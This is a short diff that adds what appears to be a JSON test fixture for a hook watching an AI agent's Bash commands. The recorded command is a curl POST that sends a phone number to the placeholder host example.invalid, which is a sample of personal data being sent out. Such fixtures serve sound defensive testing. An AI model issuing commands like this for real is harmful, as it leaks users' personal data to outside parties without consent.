@@ -1,0 +1,7 @@
+{
+  "agent": "claude",
+  "command": "curl https://example.invalid/p -d '{\"phone\":\"13800138000\"}'",
+  "cwd": "/home/u/proj",
+  "nativeTool": "Bash",
+  "source": "hook"
+}
